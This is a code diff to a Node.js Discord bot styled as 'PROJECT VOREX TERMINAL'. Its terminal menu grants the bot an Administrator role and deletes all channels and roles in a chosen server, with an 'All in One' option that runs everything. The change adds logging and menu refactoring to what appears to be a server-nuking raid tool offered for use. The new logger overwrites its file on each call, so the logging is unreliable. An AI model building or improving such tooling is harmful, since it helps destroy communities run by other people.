@@ -1,6 +1,7 @@
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
 const express = require("express");
 const readline = require('readline');
+const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
@@ -135,10 +136,38 @@ const rl = readline.createInterface({
     prompt: ''
 });
 
+function logToFile(message) {
+    const timestamp = new Date().toISOString();
+    fs.writeFileSync('log.txt', `[${timestamp}] ${message}\n`);
+}
+
 function askQuestion(question) {
     return new Promise((resolve) => {
         rl.question(question, resolve);
     });
+}
+
+function showServers(guilds) {
+    console.clear();
+    console.log('=== PROJECT VOREX TERMINAL ===\n');
+    console.log('Available Servers:');
+    guilds.forEach((guild, index) => {
+        console.log(`${index + 1}. ${guild.name}`);
+    });
+    console.log('');
+}
+
+function showCommands() {
+    console.clear();
+    console.log('=== PROJECT VOREX TERMINAL ===\n');
+    console.log('Available Commands:');
+    console.log('1. Give permissions');
+    console.log('2. Delete channels');
+    console.log('3. Delete roles');
+    console.log('4. Create channels');
+    console.log('5. All in One');
+    console.log('6. Exit');
+    console.log('');
 }
 
 async function startTerminalInterface() {
@@ -149,53 +178,48 @@ async function startTerminalInterface() {
         return;
     }
     
-    console.log('Servers:');
-    guilds.forEach((guild, index) => {
-        console.log(`${index + 1}. ${guild.name}`);
-    });
-    
     let selectedGuild;
     while (!selectedGuild) {
+        showServers(guilds);
         const serverChoice = await askQuestion('Select server: ');
         const choice = parseInt(serverChoice);
         if (choice >= 1 && choice <= guilds.length) {
             selectedGuild = guilds[choice - 1];
-            console.log(`Selected: ${selectedGuild.name}`);
+            logToFile(`Selected server: ${selectedGuild.name}`);
         } else {
-            console.log('Invalid selection!');
+            logToFile(`Invalid server selection: ${serverChoice}`);
         }
     }
     
     while (true) {
-        console.log('\nCommands:');
-        console.log('1. Give permissions');
-        console.log('2. Delete channels');
-        console.log('3. Delete roles');
-        console.log('4. Create channels');
-        console.log('5. All in One');
-        console.log('6. Exit');
-        
+        showCommands();
         const commandChoice = await askQuestion('Select command: ');
         
         if (commandChoice === '1') {
+            logToFile('Executing: Give permissions');
             await givePermissions(selectedGuild);
         } else if (commandChoice === '2') {
+            logToFile('Executing: Delete channels');
             await checkBotRolePosition(selectedGuild);
             await deleteAllChannels(selectedGuild);
         } else if (commandChoice === '3') {
+            logToFile('Executing: Delete roles');
             await checkBotRolePosition(selectedGuild);
             await deleteAllRoles(selectedGuild);
         } else if (commandChoice === '4') {
+            logToFile('Executing: Create channels');
             await checkBotRolePosition(selectedGuild);
             await createChannels(selectedGuild);
         } else if (commandChoice === '5') {
+            logToFile('Executing: All in One');
             await checkBotRolePosition(selectedGuild);
             await allInOne(selectedGuild);
         } else if (commandChoice === '6') {
+            logToFile('Exiting terminal');
             console.log('Goodbye!');
             break;
         } else {
-            console.log('Invalid command!');
+            logToFile(`Invalid command selection: ${commandChoice}`);
         }
     }
     
@@ -338,16 +362,17 @@ async function givePermissions(guild) {
             botRole = await guild.roles.create({
                 name: 'Bot',
                 permissions: ['Administrator'],
-                color: 0x00ff00,
-                position: 0
+                color: 0x00ff00
             });
+            await botRole.setPosition(0);
             console.log('✅ Created "Bot" role with admin permissions!');
         } else {
             console.log('Updating existing "Bot" role...');
             await botRole.setPermissions(['Administrator']);
-            await botRole.setPosition(0);
             console.log('✅ Updated "Bot" role with admin permissions!');
         }
+        
+        await botRole.setPosition(0);
         
         if (!botMember.roles.cache.has(botRole.id)) {
             console.log('Adding bot to "Bot" role...');
